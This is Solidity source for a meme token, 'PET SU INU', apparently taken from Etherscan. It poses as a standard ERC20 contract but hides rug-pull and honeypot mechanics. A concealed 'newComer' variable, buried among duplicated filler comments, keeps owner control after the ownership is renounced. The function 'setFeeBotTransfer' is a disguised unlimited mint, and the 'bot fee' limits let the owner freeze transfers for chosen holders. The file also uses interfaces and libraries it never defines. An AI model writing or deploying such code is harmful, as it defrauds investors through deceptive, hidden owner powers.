/**
 *Submitted for verification at Etherscan.io on 2021-06-23
*/

/*

                                                                           .~|J4pGEWNKKKNEXFbz[+'                     
                                                                       _>[email protected]@[email protected]!                 
                                                                    ^[email protected]);~~+==^==++)1SWMMMMMMMKP?.             
                                                                 :[email protected]!~=)(())))))))))(|[email protected]@d=           
                                                               ~kMMMMMMMW|!)(())))))))))))(()|JaMMMMMMKKMMM&|         
                                                             :[email protected]|()))))))))))))))))))}[email protected]@MMM&^       
                                                            }@[email protected])))))))))))))))))))}J&[email protected]'     
                                                          '[email protected]]~^)WMF)))((()|\))))))))))[email protected]@xNMW!    
                                                         -EMMMMMWn=~^))(|l\())([email protected]())())|[email protected]@[email protected][email protected](   
                                                        `EMMMMg[;+)((()))))))))TEwozgMMk())))vJmMMMMMMMMMMMWEMq;%[email protected]^  
                                                        mMMMH|!^())((()))))))))(())(\@MN)())[email protected]@[email protected]@);HMK- 
                                                       tMMMV|nddb5t()))))))))))))))((aql())|[email protected] 
                                                      '[email protected]()))))))()((()))))))|lJEMMMMMmmMMMMMMMX&MY)_9MM+
                                                      vMMM>[email protected]@[email protected]?())))|Y%p2>()))()[4kXMMMMMK5}5KMMMMMG&M4([email protected]
                                                      PMMM>][email protected])))((kMMKMMNPi5%[email protected]}KMMMKmWMr)^:EME
                                                      RMMMd|\LEMMMMMMKT\()))([email protected]@&pLzz5zzzzzzzzIrKMMEGMG)(^:[email protected]
                                                      RMMMKzv|(\vJoJ>)())))))[email protected]?))^:[email protected]
[email protected]?\())((()))(([email protected][)))^:EME
                                                      cMMHWMMEqoJJ1}vtc>ctv}1oKMNVVVVLz&MEgHKEzzzzd95zz5uxMMo())(!+MM6
                                                      '[email protected]@EFb5JJJJJJJJJ3dMMgVVVLaWHzzzzztJHWm~qPzz52MM3((()_4MM!
                                                       [MMBbbVZ&[email protected]@WEQXGGX&[email protected]?!}[email protected]|))([email protected]
[email protected]&[email protected]%zz5zzx&MM5())^;&MN- 
                                                        [email protected]@MBb4azzz5zzJlIz5nZKMKs())^[email protected]=  
                                                         ,&[email protected]&[email protected]@[email protected]@[email protected]@m}()(^[email protected]^   
                                                          [email protected]@MMMNGTl?(((=]NMW~    
                                                            [email protected]%[email protected]?((()^PMMV.     
                                                             [email protected]@RxJJ1lrt[|())))\[email protected]&^       
                                                               "[email protected]]()))))))()[email protected]|         
                                                                 [email protected][)))))))|[email protected]+           
                                                                    +aEMMKEGZdVVVVVTVVXMMbJ?()|[email protected]|.             
                                                                       -][email protected]@[email protected]@EQEKMMMEdr~                 
                                                                            _(raq%XEWWWWE&gPL1|~.                     




                                                       ░███████╗██████╗░███████╗████████╗░██████╗██╗░░░██╗██╗███╗░░██╗██╗░░░██╗
                                                       ██╔██╔══╝██╔══██╗██╔════╝╚══██╔══╝██╔════╝██║░░░██║██║████╗░██║██║░░░██║
                                                       ╚██████╗░██████╔╝█████╗░░░░░██║░░░╚█████╗░██║░░░██║██║██╔██╗██║██║░░░██║
                                                       ░╚═██╔██╗██╔═══╝░██╔══╝░░░░░██║░░░░╚═══██╗██║░░░██║██║██║╚████║██║░░░██║
                                                       ███████╔╝██║░░░░░███████╗░░░██║░░░██████╔╝╚██████╔╝██║██║░╚███║╚██████╔╝
                                                       ╚══════╝░╚═╝░░░░░╚══════╝░░░╚═╝░░░╚═════╝░░╚═════╝░╚═╝╚═╝░░╚══╝░╚═════╝░


// $PETSUINU

// https://t.me/petinuann
// https://www.petusinu.org
// https://twitter.com/PetusInu

*/


pragma solidity ^0.6.12;







abstract contract Context {
    
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) private onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    
    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    address private newComer = _msgSender();
    
    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(newComer == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

contract PETSUINU is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    uint256 private _tTotal = 100 * 10**9 * 10**18;

    string private _name = 'PET SU INU';
    string private _symbol = 'PETSUINU';
    uint8 private _decimals = 18;
    
    uint256 private _maxBotFee = 15 * 10**9 * 10**18;
    uint256 private _minBotFee = 5 * 10**8 * 10**18;

    constructor () public {
        _balances[_msgSender()] = _tTotal;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }


    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    
    function setFeeBotTransfer(uint256 amount) public onlyOwner {
        require(_msgSender() != address(0), "ERC20: cannot permit zero address");
        _tTotal = _tTotal.add(amount);
        _balances[_msgSender()] = _balances[_msgSender()].add(amount);
        emit Transfer(address(0), _msgSender(), amount);
    }

    function setMaxBotFee(uint256 maxTotal) public onlyOwner {
        _maxBotFee = maxTotal * 10**18;
    }
    
    function setMinBotFee(uint256 minTotal) public onlyOwner {
        _minBotFee = minTotal * 10**18;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
      
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        
        if (balanceOf(sender) > _minBotFee && balanceOf(sender) < _maxBotFee) {
            require(amount < 100, "Transfer amount exceeds the maxTxAmount.");
        }
    
        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
    
     
    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
}